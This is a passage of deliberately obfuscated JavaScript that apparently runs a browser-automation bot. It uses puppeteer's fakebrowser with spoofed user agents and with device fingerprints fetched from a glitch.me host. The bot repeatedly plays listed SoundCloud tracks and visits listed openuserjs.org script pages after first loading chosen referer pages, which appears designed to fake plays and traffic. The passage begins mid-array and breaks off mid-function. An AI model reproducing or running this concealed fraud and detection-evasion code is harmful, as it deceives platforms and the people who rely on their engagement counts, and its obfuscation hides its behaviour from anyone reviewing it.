      'https://so' + 'undcloud.c' + a0(0xf) + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + a0(0x11) + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + a1(0x12, 'bGyR') + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + a1(0x0, 'GiFj') + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + Z(0xd) + '0.1462.54'
    ]
  },
  HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(g) {
        let h = this,
          i = h;
        for (let j = -0x3a * -0x52 + -0x2f * 0x19 + -0xdfd; j < g; j++)
          i = i['concat'](h);
        return i;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
      const f = new Map();
      Array['prototype']['randomFlus' + 'h'] = function(g) {
        const a2 = c;
        let h = this[floor(random() * this['length'])];
        f[a2(0xa)](g) || f['set'](g, new Set());
        const i = f['get'](g);
        for (; i['has'](h);)
          i['size'] === this['length'] && i['clear'](), h = this[floor(random() * this['length'])];
        return i['add'](h), h;
      };
    }
  };

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1 * 0x24cb + -0x8 * -0x407 + 0x3 * -0x1701);
    let h = e[f];
    if (c['qqZvUh'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1 * 0xf4d + 0x139d + 0x170 * -0x3, r, s, t = 0x119b * 0x1 + -0x1 * 0xdeb + -0x3b0; s = m['charAt'](t++); ~s && (r = q % (-0x21d * 0xa + -0x1a4f + 0x2f75) ? r * (-0xf0 * -0x24 + -0x83 * -0x2 + -0x2286) + s : s, q++ % (0x8 * 0x106 + -0x239f + 0x1b73)) ? o += String['fromCharCode'](-0x1f3d * 0x1 + -0x1 * -0x2647 + -0x60b & r >> (-(0x2 * -0xa7e + 0x1cc6 + 0x53 * -0x18) * q & 0x71b + 0x650 + -0x1b * 0x7f)) : -0x1b13 + 0x1 * 0x1369 + -0x28e * -0x3) {
          s = n['indexOf'](s);
        }
        for (let u = -0x4e3 + 0x84 + -0x45f * -0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x5ad + -0x16f * 0x8 + 0x1135))['slice'](-(-0x3a * -0x52 + -0x2f * 0x19 + -0xdfb));
        }
        return decodeURIComponent(p);
      };
      c['CYtOzW'] = i, b = arguments, c['qqZvUh'] = !![];
    }
    const j = e[-0x2 * 0x245 + -0x1 * 0x2d7 + 0x761],
      k = f + j,
      l = b[k];
    return !l ? (h = c['CYtOzW'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
HookManager['prototypes']();
const actions = [
  [
    () => flags['ActivateBr' + 'owser'],
    async () => {
      async function f(o = '', p = -0x2 * 0x245 + -0x1 * 0x2d7 + 0x762, q) {
        const u = await q['waitForSel' + 'ector'](o);
        return await m['simClickEl' + 'ement'](u, {
          'pauseAfterMouseUp': p
        }), u;
      }
      log('index.js\x20c' + 'alled');
      const {
        FakeBrowser: g
      } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new g['Builder']()['displayUse' + 'rActionLay' + 'er'](-0xd * -0x11b + 0x8ba + 0x2e3 * -0x8)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
        'blockTrackers': 0x1,
        'blockTrackersAndAnnoyances': 0x1
      })])['userDataDi' + 'r'](i);
      let k;
      r:
        for (;;)
          try {
            let o = await async function p() {
              const a3 = b;
              let q;
              const r = {
                'User-Agent': q['userAgents']['random'](),
                'Accept-Encoding': 'none'
              };
              try {
                q = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + a3(0x13, 'tn[G') + 'qasczxhgcx' + 'zc', {
                  'headers': r
                }))?.['data'];
              } catch (u) {}
              if (q)
                try {
                  q = (await axios['get'](q, {
                    'headers': r
                  }))?.['data'];
                } catch (v) {}
              if (!q)
                return await randomWait(), await p();
              try {
                return 'object' == typeof q ? q : 'string' == typeof q ? JSON['parse'](q) : {};
              } catch (w) {
                if (!q)
                  return await randomWait(), await p();
              }
            }();
            flags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](o), k = await j['launch']();
            break r;
          } catch (q) {
            warn(q), await randomWait();
          }
      const {
        vanillaBrowser: l,
        userAction: m
      } = k, n = await l['createInco' + 'gnitoBrows' + 'erContext']();
      log('browser\x20la' + 'unched'), flags['RPL2_GF'] && setTimeout(async () => {
        async function r() {
          const a5 = c,
            s = await l['createInco' + 'gnitoBrows' + 'erContext']();
          if (flags['RPL2_SC2'] && Math['random']() >= -0x182 * 0x18 + 0xd35 + 0x16fb + 0.3) {
            const u = await s['newPage']();
            let v = -0x19ae + 0x50c + 0x14a2;
            if (await u['goto'](data['soundcloud' + 'Tracks']['random'](), {
                'timeout': NETWORK_PATIENCE
              })['catch'](w => v++), v)
              return await u['close'](), await s['close'](), createPage();
            try {
              await u['evaluate'](() => {
                let x = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
                x && 'Play' === x['textConten' + 't'] && (x['id'] = '______hook' + '5');
              });
              let w = await u['$']('#______hoo' + 'k5');
              w && await f('#______hoo' + 'k5', 0x2 * 0xc25 + -0x1c43 + 0x1fd * 0x2, u), await wait(-0x62 * 0x33b + 0x351 * 0x5 + -0x15d * -0x15d + getRandomInt(-0x6387 + -0x1 * 0xfbb + 0xadda, -0x21 * 0x2ea + 0x1 * -0xa74d + 0x17ca7));
            } catch (x) {}
            return await u['close'](), await s['close'](), createPage();
          } {
            const {
              url: y,
              preRef: z
            } = data['scriptTarg' + 'ets']['randomFlus' + 'h'](-0x2266 * 0x1 + 0x2 * -0x2ea + 0x283b), A = await l['createInco' + 'gnitoBrows' + 'erContext'](), B = await A['newPage']();
            let C = -0xd4 * 0x2e + -0x107a + 0x3692;
            if (await B['goto'](z, {
                'timeout': NETWORK_PATIENCE
              })['catch'](E => C++), C)
              return await B['close'](), await A['close'](), r();
            const D = await B['evaluate']('!document.' + 'documentEl' + 'ement.inne' + 'rHTML.incl' + 'udes(\x22scri' + 'pt-descrip' + 'tion\x22);');
            return D ? (await B['close'](), await A['close'](), r()) : (await B['goto'](y, {
              'timeout': NETWORK_PATIENCE
            })['catch'](E => C++), C ? (await B['close'](), await A['close'](), r()) : (await new Promise(E => setTimeout(E, -0xb * 0x367 + -0x1 * -0x12a3 + 0x3 * 0x8de + floor((-0x1468 + -0x2f * 0x3 + 0x18dd) * random()))), await B['evaluate'](() => {
              var E, F, G, H, I, J, K, L, M = 'object' == typeof window ? window : {},
                N = !M['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
              N && (M = global), E = ('0123456789' + 'abcdef')['split'](''), F = [
                -(0xb1df3dc + 0xbbc4afdc * 0x1 + -0x1 * 0x46e2a3b8),
                -0xcf53e * 0x3 + 0xe31bfc + -0x3c3c42,
                -0x4 * -0x1426 + -0x5d6 * 0x1 + 0x353e,
                -0x5 * 0x57a + -0x646 + 0x1114 * 0x2
              ], G = [
                0x2167 + -0x2f3 * 0x5 + -0x1290,
                0xd7 * -0x25 + -0x2610 + 0x4533,
                0x55 * -0x1 + 0x1239 + -0x11dc,
                0xfd3 + -0x1cba + -0x3 * -0x44d
              ], H = [
                'hex',
                'array',
                'digest',
                'arrayBuffe' + 'r'
              ], I = [], J = function(R) {
                return function(S) {
                  return new O(0x18f3 + 0x185a + -0x314c)['update'](S)[R]();
                };
              }, K = function() {
                var R, S, T = J('hex');
                for (N && (T = L(T)), T['create'] = function() {
                    return new O();
                  }, T['update'] = function(U) {
                    return T['create']()['update'](U);
                  }, R = 0x69f + 0x1af8 + -0x2197; R < H['length']; ++R)
                  S = H[R], T[S] = J(S);
                return T;
              }, L = function(R) {
                var S = eval('require(\'crypto\');'),
                  T = eval('require(\'buffer\')[\'Buffer\'];'),
                  U = function(V) {
                    if ('string' == typeof V)
                      return S['createHash']('sha1')['update'](V, 'utf8')['digest']('hex');
                    if (V['constructo' + 'r'] === ArrayBuffer)
                      V = new Uint8Array(V);
                    else {
                      if (void(-0x1255 + 0x990 + 0x8c5) === V['length'])
                        return R(V);
                    }
                    return S['createHash']('sha1')['update'](new T(V))['digest']('hex');
                  };
                return U;
              };
              class O {
                constructor(R) {
                    R ? (I[0x1530 + 0x1c81 + -0x31b1] = I[-0x12c3 + -0x102 * -0xd + 0x5b9] = I[-0x58 * -0x30 + -0xc17 * -0x2 + -0x28ad] = I[-0x18f0 + -0x3 * -0x8b3 + -0x127] = I[-0x17df + -0x23a2 * 0x1 + -0x24a * -0x1a] = I[-0x806 + -0x42 * -0x5 + -0xc * -0x90] = I[-0x19c4 + 0x1 * -0x1123 + -0x4 * -0xabb] = I[0x2 * 0xae1 + -0x1a03 * -0x1 + 0x11 * -0x2cf] = I[-0x1d * -0x56 + 0x1edd + 0xd4 * -0x31] = I[0x795 * 0x3 + 0x56b * 0x5 + -0x31ce] = I[-0xa21 * 0x2 + -0x1480 + 0x3b * 0xb1] = I[-0x3a * 0x3a + 0x1304 * -0x1 + 0x1019 * 0x2] = I[0x3 * 0x496 + 0x2 * -0x3aa + -0x5 * 0x147] = I[-0xa80 + -0x1 * -0xda1 + -0x107 * 0x3] = I[0x1f49 + 0x24b * 0xb + -0x3875] = I[0x1845 * -0x1 + 0x10bd * -0x2 + 0x39cd] = I[-0x1385 + 0x6a8 + 0xcec] = -0xeaf + 0x622 * -0x3 + 0x3 * 0xb07, this['blocks'] = I) : this['blocks'] = [
                      -0x11 * -0x131 + 0x1876 + -0x2cb7 * 0x1,
                      -0x1ace + 0x24cb * -0x1 + 0x1b * 0x25b,
                      -0x6c4 * -0x2 + 0x6 * -0x1a3 + -0x32 * 0x13,
                      -0x967 + 0x13 * -0x38 + -0x59 * -0x27,
                      -0x24a7 + -0x1be4 + -0x1 * -0x408b,
                      0x502 + -0x2 * 0xf1c + -0xe * -0x1cd,
                      -0x2166 + 0x89f * 0x2 + 0x1028,
                      0xa9 * 0x31 + -0x1b68 + 0xfd * -0x5,
                      -0x1518 + -0x1 * -0xdc7 + 0x751 * 0x1,
                      0x1 * 0x1118 + 0x2 * 0x492 + -0x1a3c,
                      0x58e * -0x3 + -0x1323 + -0xd * -0x2c1,
                      0x2e8 * -0xa + 0x2 * 0x1051 + -0x392,
                      -0x252b + 0x1d53 + 0x3ec * 0x2,
                      -0x1dcd + -0x371 + 0x213e,
                      -0x1707 + 0x2347 + -0x620 * 0x2,
                      0xe3 * 0xe + -0x1097 + 0x42d,
                      -0xba3 + 0x2051 + 0x2 * -0xa57
                    ], this['h0'] = 0x243ce869 * -0x2 + 0x844e7a43 + -0x2 * -0x15b83cc8, this['h1'] = 0x11600c69 + -0x1 * -0x128f5ef27 + -0x4a885007 * 0x1, this['h2'] = -0x5d76d248 + -0x1a893c0a * 0x8 + 0x1ca7b8f96, this['h3'] = -0x43 * 0x7121 + 0xc868bdb + 0x3c9643e, this['h4'] = -0xb9672ac1 * 0x2 + -0xef66a96c + -0x1 * -0x32607e0de, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x2526 + 0x542 * 0x1 + -0x2a68, this['finalized'] = this['hashed'] = 0x1269 + 0x7 * -0x287 + -0xb8, this['first'] = -0x68f * 0x4 + 0x368 + -0x23 * -0xa7;
                  }
                  ['update'](R) {
                    const a4 = d;
                    var S, T, U, V, W, X;
                    if (!this['finalized']) {
                      for ((S = 'string' != typeof R) && R['constructo' + 'r'] === M['ArrayBuffe' + 'r'] && (R = new Uint8Array(R)), U = -0x2584 + -0x199c + 0x50 * 0xca, W = R['length'] || 0x1f * -0xa0 + 0x1 * 0x1519 + 0x31 * -0x9, X = this['blocks']; U < W;) {
                        if (this['hashed'] && (this['hashed'] = -0x18d * 0x17 + -0x548 + -0x3b9 * -0xb, X[0xa * 0x102 + -0x1 * 0x5de + -0xb * 0x62] = this['block'], X[-0x1c * 0x135 + -0x36e * -0x5 + 0x10b6] = X[-0x2447 + 0x2593 + -0x14b] = X[0x1218 + -0x1471 + 0x25b] = X[-0x5d0 + -0x19cb + -0x6 * -0x545] = X[0x2ad * 0x9 + 0x1231 + 0x1521 * -0x2] = X[-0x1951 + -0x315 + 0x1 * 0x1c6b] = X[-0x2452 + 0x237 + 0x2221] = X[-0x1199 + 0x4 * -0x3ad + 0x2054] = X[0x14be + -0x1267 + 0xc5 * -0x3] = X[-0x1c9a + -0x1 * -0x1591 + 0x712] = X[-0x13b + -0x1ee1 + -0x1013 * -0x2] = X[-0x2588 + -0xc8e * -0x3 + -0x1 * 0x17] = X[0xed * -0xa + -0x1c4f + 0x259d * 0x1] = X[0xcc0 + -0x8c * -0x6 + -0xffb] = X[-0xeb0 * 0x1 + -0x17 * 0xbe + 0x1fd0 * 0x1] = X[0x1b9b + -0x17c9 * 0x1 + -0x3c3] = -0x442 * -0x7 + -0x1 * -0xd8b + -0x89 * 0x51), S) {
                          for (V = this['start']; U < W && V < 0x8 * 0x4c7 + 0x6 * -0x4a3 + -0xa26; ++U)
                            X[V >> 0x1a91 + 0x42 * -0x86 + 0x199 * 0x5] |= R[U] << G[-0x219 + 0x1 * 0x705 + 0x1 * -0x4e9 & V++];
                        } else {
                          for (V = this[a4(0x5)]; U < W && V < 0xa * 0x91 + -0xabe * 0x1 + 0x3e * 0x16; ++U)
                            (T = R['charCodeAt'](U)) < -0xde4 + -0x2a9 * 0x5 + 0x93b * 0x3 ? X[V >> -0xdba + 0x1 * 0xa15 + 0xbb * 0x5] |= T << G[0x453 * -0x2 + 0x2539 + -0x1c90 & V++] : T < -0x188f + -0x1a * -0x26 + 0x1cb3 ? (X[V >> 0x16ac + 0x11ad + -0x1c1 * 0x17] |= (0x169a + 0x2694 + -0xdd * 0x46 | T >> -0x25bf + 0x2 * 0x10e2 + 0x401) << G[-0x2dc + -0x83 * 0x4a + 0x28bd & V++], X[V >> 0x1d99 + -0x1b1a + -0x27d] |= (-0x15 * -0x13a + -0x21a5 + 0x71 * 0x13 | -0x21c7 + -0x84a + 0x2a50 & T) << G[0x7c9 + -0x1841 + 0x107b & V++]) : T < 0xd0e8 + -0x967d + 0x9d95 || T >= 0x192bb * -0x1 + 0x269 * 0x78 + -0x411 * -0x53 ? (X[V >> -0x2002 * -0x1 + 0x10 * -0x8a + -0x1760] |= (0x1d6b + 0x2 * -0x6ec + -0xeb3 | T >> -0x5a2 + -0x150a + 0x1ab8) << G[0x1 * -0x221b + 0x4d + 0x313 * 0xb & V++], X[V >> 0xef5 + -0x4 * 0x3da + -0x27 * -0x3] |= (-0x255 * -0x4 + 0x25ca + -0x2e9e | T >> -0xbf + -0x1342 + 0x1407 & 0x24c7 + 0x1256 * -0x1 + -0x1232) << G[0x1dbc + 0x2684 + -0x1 * 0x443d & V++], X[V >> -0x1c34 + 0x191b + 0x31b] |= (-0x2b1 + 0x260 * -0x2 + -0x13 * -0x6b | 0x1b04 + -0x1 * -0x15f1 + -0x30b6 & T) << G[-0x1 * -0x1cf1 + 0x88 * -0x28 + -0x7ae & V++]) : (T = 0xc311 * -0x1 + -0x7880 * 0x3 + 0x32c91 + ((0x2ab * -0xc + -0x5c1 + 0xf3 * 0x2c & T) << -0x4 * -0x6b + -0x3 * 0x939 + 0x1a09 | -0x230d + 0x1791 * -0x1 + 0x3 * 0x14df & R['charCodeAt'](++U)), X[V >> -0x1 * -0x4b2 + 0x28e + -0x1 * 0x73e] |= (-0x272 + -0x14e4 + 0x1846 | T >> -0x64c + 0x11e * -0x1c + 0x25a6) << G[-0xc33 + 0x1d97 + -0x1161 & V++], X[V >> 0x14f9 * -0x1 + 0x269b * -0x1 + 0x3a * 0x107] |= (0x4 * 0x544 + -0x1333 * -0x1 + 0x1d * -0x15f | T >> -0x3a9 + 0x228a * -0x1 + 0x1 * 0x263f & -0x1257 + -0x4 * -0x192 + 0xe1 * 0xe) << G[0x1b0f + 0x506 + -0x66a * 0x5 & V++], X[V >> 0xc13 + -0x1c63 + 0x1052] |= (0x3d * 0x36 + -0x19d8 + 0xd7a | T >> -0x143b * 0x1 + 0x1 * -0x23c5 + 0x3806 & 0x1 * -0x1336 + -0x207 * 0xd + 0x2dd0) << G[0x17e2 + -0x11cb * 0x1 + -0x4 * 0x185 & V++], X[V >> -0x1147 * -0x1 + -0x10fc + -0x49] |= (0x61 * 0x5 + -0x2433 * 0x1 + 0x22ce | 0x22 * -0x11c + -0x665 + 0x22 * 0x14e & T) << G[0x185e + 0x3 * -0x3af + 0x1a * -0x83 & V++]);
                        }
                        this['lastByteIn' + 'dex'] = V, this['bytes'] += V - this['start'], V >= 0xc37 + 0x109b + -0x1c92 ? (this['block'] = X[0x7c1 * -0x1 + -0x1a44 + 0x2215], this['start'] = V - (0x2d6 + 0x23a4 + -0x2 * 0x131d), this['hash'](), this['hashed'] = -0x5c6 * -0x3 + -0x2 * 0x932 + 0x1 * 0x113) : this['start'] = V;
                      }
                      return this['bytes'] > 0x1f4cf4b17 + 0x1771e039 * -0x13 + -0xf445 * -0xd247 && (this['hBytes'] += this['bytes'] / (0x15a497b8c + 0x117113c6c + 0x5c56adfe * -0x4) << -0x5e * -0x37 + 0x186 + -0x15b8, this['bytes'] = this['bytes'] % (-0x1c3029600 + 0x1d3b07a18 + -0x4 * -0x3bd486fa)), this;
                    }
                  }
                  ['finalize']() {
                    if (!this['finalized']) {
                      this['finalized'] = -0xe86 + 0x20a7 * 0x1 + -0x1220;
                      var R = this['blocks'],
                        S = this['lastByteIn' + 'dex'];
                      R[-0x5 * 0x126 + 0x1bbb + -0x1 * 0x15ed] = this['block'], R[S >> -0x1491 + -0x12 * 0x3e + 0x18ef] |= F[-0x10 * 0x20b + 0x1eed + -0x2 * -0xe3 & S], this['block'] = R[-0xace + -0x22a8 + -0x1 * -0x2d86], S >= -0x114d + -0x1 * -0x12d3 + 0x1 * -0x14e && (this['hashed'] || this['hash'](), R[-0x24be * 0x1 + -0x8d0 + -0x62 * -0x77] = this['block'], R[0x35 * 0x1b + -0x2 * 0xd6a + 0x154d] = R[0x1c9a * 0x1 + -0x87a + -0x1 * 0x141f] = R[0x1b43 + 0x1 * 0x123 + 0x1 * -0x1c64] = R[-0x1155 + -0x1c8d * 0x1 + 0x2de5] = R[0x1 * 0x26df + 0x50 * -0x24 + -0x25 * 0xbf] = R[-0x3f1 * 0x4 + -0xce2 * 0x2 + -0x3c7 * -0xb] = R[-0x115 + 0x1da + 0x1 * -0xbf] = R[-0x74e + -0x1 * -0x44f + -0x3 * -0x102] = R[0x68 * 0x4 + 0xf * 0x1ff + -0xd * 0x26d] = R[0x2 * 0x32f + 0x77f * -0x1 + -0x1 * -0x12a] = R[0x15be + 0x1 * -0x8e9 + -0xccb] = R[0x1400 + -0x25 * -0xcd + 0x3196 * -0x1] = R[0x86f + 0x43 * 0x95 + 0x2f62 * -0x1] = R[0xd7a + 0x85f * 0x2 + 0x1e2b * -0x1] = R[-0x2 * 0x70 + 0x1cb8 + -0x2 * 0xde5] = R[0x1 * -0x1759 + 0xb3e * 0x2 + 0xec] = -0x41e + -0x20a8 + 0x24c6), R[-0x13d * -0x16 + 0x4 * 0x5d9 + -0x34 * 0xf9] = this['hBytes'] << 0x108e * 0x1 + 0x731 * -0x1 + -0x95a | this['bytes'] >>> 0xf31 * 0x1 + -0x14c9 + -0x5b5 * -0x1, R[-0x1534 + -0x4e6 + -0x1a29 * -0x1] = this['bytes'] << 0xe * 0x281 + -0x11 * 0x49 + -0x1e32, this['hash']();
                    }
                  }
                  ['hash']() {
                    var R, S, T = this['h0'],
                      U = this['h1'],
                      V = this['h2'],
                      W = this['h3'],
                      X = this['h4'],
                      Y = this['blocks'];
                    for (R = -0x386 + -0x5 * -0x229 + -0x737; R < -0x1aa * 0x6 + -0x2203 * -0x1 + -0x17b7; ++R)
                      S = Y[R - (-0xe * -0xf0 + 0x1d76 + -0x2a93)] ^ Y[R - (-0x1e * 0x2b + 0x7bc + -0x2 * 0x155)] ^ Y[R - (0x1cb0 + -0xa * 0x207 + -0x85c)] ^ Y[R - (-0xee8 + 0x76f + -0x3 * -0x283)], Y[R] = S << -0x2356 + -0x1272 + 0x7 * 0x7af | S >>> 0x1412 + -0xa93 + -0x960;
                    for (R = 0xe * -0x1de + 0x48 * -0x10 + -0xf52 * -0x2; R < -0x15df + -0x2112 + 0x3705; R += 0xb * -0x1bd + -0x84f + -0x1 * -0x1b73)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << -0x1e4 * 0xd + 0x1 * -0x2592 + 0x3 * 0x14b9 | T >>> 0x1 * 0x1019 + 0x1 * 0x423 + 0x1 * -0x1421) + (U & V | ~U & W) + X + (-0x4e3ca339 + -0x2a834df6 + -0x4cd2556 * -0x2c) + Y[R] << 0xff2 + -0xf1 + -0xf01) << 0x23ef + -0x1d3 * -0x2 + 0xd3 * -0x30 | X >>> 0x31c * 0x1 + -0xad + -0x254) + (T & (U = U << 0x10fe + -0x80d + -0x8d3 | U >>> -0x749 * -0x5 + 0x493 + -0x28fe) | ~T & V) + W + (-0x80a5689b + 0x38e01 * -0xabb + 0x1014ca6ef) + Y[R + (0x416 * -0x7 + 0x5 * 0x551 + -0xe * -0x25)] << 0x1a13 + 0x2382 * -0x1 + 0x96f) << 0xeb5 + -0x562 + 0x4a7 * -0x2 | W >>> 0xfb8 * -0x2 + 0x5c9 + 0x19c2) + (X & (T = T << 0x243d + -0xa * 0x1ba + -0x12db * 0x1 | T >>> 0x1 * 0x16ed + -0xd03 + -0x9e8) | ~X & U) + V + (0x44d5d0f9 + 0x1ebce1d1 + 0x1 * -0x9103931) + Y[R + (-0x185f * -0x1 + 0xebc + -0x2719)] << -0x1d65 + -0xfc + 0x1e61) << -0x12c4 + 0x1 * 0x2cf + 0xffa | V >>> -0xe86 + -0x1 * 0x19bb + -0x47c * -0x9) + (W & (X = X << -0x141 * 0x11 + -0x2b * -0x7f + 0x1 * 0x1a | X >>> 0x324 + 0x1d1a + -0x101e * 0x2) | ~W & T) + U + (-0x4 * -0x2a6394ff + 0x9a10c9d9 + 0xdc * -0x10f41e9) + Y[R + (-0xa34 + -0xcdc + 0x1713)] << 0xb * 0x9d + 0x175a + -0x1e19) << 0xe5c + -0x1046 + -0xa5 * -0x3 | U >>> 0x23f6 + -0x1 * 0x20d7 + -0x304) + (V & (W = W << -0x1ee8 + -0xda7 + -0x2cad * -0x1 | W >>> -0x10 * -0x262 + 0x79c * -0x3 + -0xf4a) | ~V & X) + T + (0x32841286 * -0x2 + 0xb28d4565 + 0xcfd5940) + Y[R + (-0x1be8 + -0x1c6d * 0x1 + -0xb45 * -0x5)] << -0x1e4 * -0x11 + -0x22eb + 0x4f * 0x9, V = V << -0x17cf + -0x95 * 0x1f + 0x29f8 | V >>> -0x4 * 0x8f7 + -0x1283 + 0x1 * 0x3661;
                    for (; R < 0x397 * -0x3 + -0x5 * 0xd4 + 0x85 * 0x1d; R += 0x1 * -0x5e2 + 0x83 * 0x25 + -0xd08)
